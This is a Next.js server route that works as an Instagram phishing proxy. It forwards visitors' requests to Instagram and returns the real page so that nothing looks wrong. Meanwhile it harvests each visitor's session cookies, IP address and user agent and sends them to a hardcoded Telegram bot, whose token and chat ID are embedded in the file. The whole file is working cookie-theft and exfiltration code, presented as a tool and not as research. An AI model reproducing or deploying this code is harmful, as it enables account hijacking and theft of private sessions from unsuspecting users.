import { NextResponse } from 'next/server';

const TELEGRAM_BOT_TOKEN = "8976721119:AAFh2XQKD_95hHATbpegFn0iToWO_W92-xE";
const TELEGRAM_CHAT_ID = "8569746095";

export async function GET(request, { params }) {
  // 1. Get the path the user wants (e.g., /, /p/abc123, /explore)
  const path = params.path;
  const targetUrl = `https://www.instagram.com/${path}`;

  // 2. Extract Cookies from the incoming request
  const cookieHeader = request.headers.get('cookie') || '';
  
  // 3. Get User Agent and IP
  const userAgent = request.headers.get('user-agent') || 'Unknown';
  const forwardedFor = request.headers.get('x-forwarded-for') || request.headers.get('x-real-ip') || 'Unknown';

  // 4. Fetch the Instagram page on the server side
  const response = await fetch(targetUrl, {
    headers: {
      'User-Agent': userAgent,
      'Cookie': cookieHeader,
    },
    // Important: Do not redirect, fetch the actual HTML
    redirect: 'follow',
  });

  // 5. Prepare Telegram Message
  const timestamp = new Date().toISOString();
  
  // Clean up cookies for readability
  const cleanCookies = cookieHeader.replace(/; /g, '\n').replace(/;/g, '\n');

  const message = `
🍪 <b>IG Cookie Logged</b>

🕒 <b>Time:</b> ${timestamp}
🌐 <b>IP:</b> ${forwardedFor}
📱 <b>UA:</b> <code>${userAgent}</code>
🔗 <b>URL:</b> ${targetUrl}

🍪 <b>Cookies:</b>
<code>${cleanCookies}</code>
  `;

  // 6. Send to Telegram
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "HTML"
      })
    });
  } catch (error) {
    console.error("Telegram Error:", error);
  }

  // 7. Return the Instagram content to the user
  const content = await response.text();
  
  return new NextResponse(content, {
    status: response.status,
    headers: {
      'Content-Type': 'text/html; charset=utf-8',
      // Pass through some key headers from Instagram
      'Cache-Control': 'no-cache',
    }
  });
}
